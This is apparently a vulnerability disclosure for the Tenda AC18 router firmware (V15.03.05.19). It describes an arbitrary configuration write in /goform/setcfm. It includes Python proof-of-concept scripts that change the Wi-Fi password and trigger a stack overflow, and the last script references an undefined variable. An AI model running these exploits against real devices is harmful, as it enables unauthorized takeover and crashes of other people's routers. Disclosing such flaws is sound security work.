## Overview

- The device's official website: https://www.tenda.com.cn/product/A18.html
- Firmware download website: https://www.tenda.com.cn/material/show/2683

## Affected version

V15.03.05.19(6318)

## Vulnerability details

The Tenda AC18 firmware has an arbitrary write vulnerability in configuration items in the `/goform/setcfm` url. The `v16` variable receives the `name%d` parameter from a POST request and the `v17` variable receives the `value%d` parameter from a POST request.``SetValue(v16,v17)`will store v16 as the name of the configuration item and v17 as the value of the configuration item.So This code allows you to manipulate the values of `any` configuration items.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926144057813.png)

We can do many things through this vulnerability, such as changing the ``Wi-Fi password`, performing ` stack-overflow`attacks, and so on.

## PoC

### Chang the Wi-Fi password

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250926_153918.png)

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/setcfm"
payload = "newPassword"

data = {"save": 1,"name0": "wl2g.ssid0.wpapsk_psk","value0":payload}
response = requests.post(url, data=data)
print(response.text)
```

### Stack-overflow attacks

SetValue

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250926_154048.png)

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/setcfm"
payload = "a"*1000

data = {"save": 1,"name0": "wl2g.public.country","value0":payload}
response = requests.post(url, data=data)
print(response.text)
```

Trigger attack

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250926_154308.png)

```py
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/fast_setting_get"

response = requests.post(url, data=data)
print(response.text)
```

The `s1` variable copies the value of the configuration item `wl2g.public.country` onto the stack, which can cause a stack overflow.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250926_150537.png)

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926141817071.png)
